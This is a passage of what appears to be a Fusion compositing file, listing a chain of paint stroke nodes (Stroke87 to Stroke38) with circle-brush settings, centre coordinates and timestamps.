				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke87"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.65045291185379, 0.785742402076721 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke87 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378893389 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke86"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.592556118965149, 0.772745192050934 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke86 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378891649 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke85"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.589405298233032, 0.803465902805328 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke85 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378887614 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke84"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.819023251533508, 0.873572289943695 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke84 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378885513 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke83"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.849350154399872, 0.884994089603424 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke83 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378883053 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke82"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.904489934444427, 0.948011040687561 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke82 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378880264 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke81"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.876132309436798, 0.9617959856987 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke81 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378878523 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke80"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.629972457885742, 0.869239866733551 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke80 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378877368 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke79"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.595313131809235, 0.850728631019592 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke79 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378875688 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke78"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.556715250015259, 0.862150430679321 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke78 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378874503 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke77"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.531508445739746, 0.859787344932556 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke77 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378871563 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke76"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.550019681453705, 0.809767603874207 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke76 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378870108 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke75"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.540173292160034, 0.722725510597229 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke75 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378867273 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke74"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.475974798202515, 0.62780624628067 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke74 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378865968 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke73"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.455888152122498, 0.616778254508972 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke73 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378864258 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke72"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.437376916408539, 0.639228045940399 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke72 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378862593 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke71"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.427924364805222, 0.582118928432465 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke71 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378860013 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke70"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.438558489084244, 0.712879061698914 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke70 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378858063 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke69"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.403505325317383, 0.722331643104553 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke69 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378855888 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke68"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.39759749174118, 0.668373346328735 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke68 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378853938 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke67"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.383418679237366, 0.653012990951538 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke67 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378852048 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke66"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.38066166639328, 0.695943295955658 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke66 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378850023 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke65"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.345214664936066, 0.705789685249329 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke65 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378846993 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke64"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.325127989053726, 0.642772734165192 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke64 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378845313 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke63"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.298739671707153, 0.640409588813782 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke63 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378843528 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke62"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.325915724039078, 0.749113798141479 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke62 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378840918 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke61"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.420441120862961, 0.803072094917297 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke61 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378838983 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke60"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.457463562488556, 0.882237076759338 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke60 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378837153 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke59"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.462189853191376, 0.905474603176117 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke59 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378834708 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke58"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.447617173194885, 0.950767993927002 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke58 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378833013 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke57"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.361756592988968, 0.952737271785736 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke57 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378830478 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke56"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.314493894577026, 0.825915694236755 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke56 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378828513 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke55"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.276289880275726, 0.799921214580536 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke55 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378823413 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke54"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.245569124817848, 0.810555338859558 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke54 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378821447 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke53"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.219968497753143, 0.884206354618073 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke53 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378819093 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke52"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.22784560918808, 0.915714859962463 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke52 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378816137 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke51"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.171918079257011, 0.9235919713974 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke51 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378813843 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke50"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.050216618925333, 0.922410368919373 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke50 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378811067 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke49"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.110476568341255, 0.859787344932556 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke49 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378808188 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke48"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.198306426405907, 0.747932255268097 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke48 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378805263 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke47"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.20106340944767, 0.66128396987915 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke47 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378803448 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke46"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.173493504524231, 0.688066184520721 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke46 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378801888 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke45"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.105356439948082, 0.649862170219421 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke45 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378799952 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke44"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.143954306840897, 0.638046503067017 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke44 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378798288 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke43"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.158920839428902, 0.603387176990509 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke43 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378794733 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke42"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.233359590172768, 0.519102036952972 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke42 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378792168 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke41"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.157345414161682, 0.574241816997528 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke41 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378790173 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke40"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0793619528412819, 0.545884191989899 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke40 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378787217 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke39"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.195155575871468, 0.469870030879974 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke39 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378784188 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke38"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.192398577928543, 0.401732951402664 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke38 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378781878 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke37"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.209728240966797, 0.400945246219635 }, },
